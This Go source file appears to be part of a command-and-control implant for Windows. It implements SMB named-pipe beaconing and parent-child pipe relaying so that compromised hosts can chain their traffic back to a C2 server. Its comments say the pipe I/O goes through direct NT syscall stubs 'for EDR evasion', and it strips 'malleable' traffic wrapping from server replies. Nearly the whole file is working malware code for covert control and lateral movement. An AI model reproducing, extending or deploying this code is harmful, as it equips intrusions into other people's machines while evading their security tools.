//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

// smbConn wraps a Windows named pipe handle as a net.Conn using direct syscalls.
// All I/O goes through NtReadFile / NtWriteFile syscall stubs for EDR evasion.
type smbConn struct {
	handle     uintptr
	sm         *syscallManager
	mu         sync.Mutex
	closed     bool
	localAddr  net.Addr
	remoteAddr net.Addr
}

func (c *smbConn) Read(b []byte) (int, error) {
	if c.closed {
		return 0, io.ErrClosedPipe
	}
	n, err := syscallNtReadPipe(c.sm, c.handle, b)
	if err != nil {
		return 0, err
	}
	if n == 0 {
		return 0, io.EOF
	}
	return n, nil
}

func (c *smbConn) Write(b []byte) (int, error) {
	if c.closed {
		return 0, io.ErrClosedPipe
	}
	total := 0
	for total < len(b) {
		n, err := syscallNtWritePipe(c.sm, c.handle, b[total:])
		if err != nil {
			return total, err
		}
		if n == 0 {
			break
		}
		total += n
	}
	return total, nil
}

func (c *smbConn) Close() error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.closed {
		return nil
	}
	c.closed = true
	return syscallNtCloseHandle(c.sm, c.handle)
}

func (c *smbConn) LocalAddr() net.Addr                { return c.localAddr }
func (c *smbConn) RemoteAddr() net.Addr               { return c.remoteAddr }
func (c *smbConn) SetDeadline(t time.Time) error      { return nil }
func (c *smbConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *smbConn) SetWriteDeadline(t time.Time) error { return nil }

type smbAddr struct{ name string }

func (a *smbAddr) Network() string { return "smb" }
func (a *smbAddr) String() string  { return a.name }

// ConnectSMBChildPipe connects to a parent SMB named pipe as a client.
func ConnectSMBChildPipe(pipeName string) (net.Conn, error) {
	sm := getPipeSyscallManager()
	pipeName = strings.TrimPrefix(pipeName, `\\.\pipe\`)
	pipeName = strings.TrimPrefix(pipeName, "smb://")
	if pipeName == "" {
		return nil, fmt.Errorf("empty pipe name")
	}
	handle, err := syscallNtOpenPipe(sm, pipeName)
	if err != nil {
		return nil, fmt.Errorf("ConnectSMBChildPipe(%s): %w", pipeName, err)
	}
	addr := &smbAddr{name: pipeName}
	return &smbConn{handle: handle, sm: sm, localAddr: addr, remoteAddr: addr}, nil
}

// StartSMBParentPipe starts a goroutine that creates named pipe server instances
// and handles child connections in a loop. Each connection reads a beacon request,
// processes it (same logic as p2pHandleChild), and writes the response back.
func StartSMBParentPipe(pipeName string) error {
	pipeName = strings.TrimPrefix(pipeName, `\\.\pipe\`)
	pipeName = strings.TrimPrefix(pipeName, "smb://")
	if pipeName == "" {
		return fmt.Errorf("empty pipe name")
	}

	go func() {
		for {
			if err := serveOneSMBCient(pipeName); err != nil {
				if Debug {
					fmt.Printf("[!] SMB parent pipe error: %v\n", err)
				}
				time.Sleep(2 * time.Second)
			}
		}
	}()

	if Debug {
		fmt.Printf("[+] SMB parent pipe listener started on %s\n", pipeName)
	}
	return nil
}

// serveOneSMBRelay handles one child connection on the SMB parent pipe.
// The child sends an opaque v2 envelope; we queue it for the next parent
// beacon and return the server's encrypted reply envelope verbatim —
// identical to p2pHandleChild, so the parent never sees child plaintext.
func serveOneSMBCient(pipeName string) error {
	sm := getPipeSyscallManager()
	handle, err := syscallNtCreateNamedPipeFile(sm, pipeName, 255)
	if err != nil {
		return fmt.Errorf("create pipe: %w", err)
	}
	defer syscallNtCloseHandle(sm, handle)

	if err := syscallNtFsControlListen(sm, handle); err != nil {
		return fmt.Errorf("listen: %w", err)
	}

	conn := &smbConn{
		handle:     handle,
		sm:         sm,
		localAddr:  &smbAddr{name: pipeName},
		remoteAddr: &smbAddr{name: pipeName},
	}
	defer conn.Close()

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return fmt.Errorf("read len: %w", err)
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return fmt.Errorf("bad len: %d", rlen)
	}
	body := make([]byte, rlen)
	if _, err := io.ReadFull(conn, body); err != nil {
		return fmt.Errorf("read body: %w", err)
	}

	childID := p2pEnvelopeUUID(body)
	if childID == "" {
		return fmt.Errorf("empty child UUID")
	}
	// Bind this connection to the claimed child UUID; reject if another
	// connection already owns it or the relay is at capacity.
	if !p2pClaimChild(conn, childID) {
		return fmt.Errorf("child UUID %s already owned by another connection", childID)
	}
	defer p2pReleaseChild(conn)
	if !p2pQueueChildFrame(childID, body) {
		return fmt.Errorf("queue child frame")
	}

	deadline := time.Now().Add(p2pRelayTimeout)
	for time.Now().Before(deadline) {
		if reply := p2pTakeChildReply(childID); reply != nil {
			if err := binary.Write(conn, binary.BigEndian, uint32(len(reply))); err != nil {
				return fmt.Errorf("write resp len: %w", err)
			}
			if _, err := conn.Write(reply); err != nil {
				return fmt.Errorf("write resp: %w", err)
			}
			return nil
		}
		time.Sleep(100 * time.Millisecond)
	}
	return fmt.Errorf("relay reply timeout")
}

// sendSMBBeacon sends a beacon payload over SMB named pipe to the C2 server.
// The pipe name is determined from smbPipeName or C2URL with "smb://" prefix.
func sendSMBBeacon(body []byte) []byte {
	pipeName := smbPipeName
	if pipeName == "" {
		pipeName = C2URL
	}
	pipeName = strings.TrimPrefix(pipeName, "smb://")
	pipeName = strings.TrimPrefix(pipeName, `\\.\pipe\`)

	conn, err := ConnectSMBChildPipe(pipeName)
	if err != nil {
		if Debug {
			fmt.Printf("[!] SMB dial to %s failed: %v\n", pipeName, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		if Debug {
			fmt.Printf("[!] SMB write header: %v\n", err)
		}
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		if Debug {
			fmt.Printf("[!] SMB write body: %v\n", err)
		}
		return nil
	}

	var msgLen uint32
	if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
		if Debug {
			fmt.Printf("[!] SMB read resp len: %v\n", err)
		}
		return nil
	}
	if msgLen == 0 || msgLen > 16*1024*1024 {
		if Debug {
			fmt.Printf("[!] SMB bad resp len: %d\n", msgLen)
		}
		return nil
	}

	resp := make([]byte, msgLen)
	if _, err := io.ReadFull(conn, resp); err != nil {
		if Debug {
			fmt.Printf("[!] SMB read resp: %v\n", err)
		}
		return nil
	}

	if Debug {
		fmt.Printf("[+] SMB beacon OK from %s, %d bytes\n", pipeName, len(resp))
	}
	// Strip any malleable cover the server wrapped around the raw SMB frame.
	return stripMalleableWrapping(resp)
}
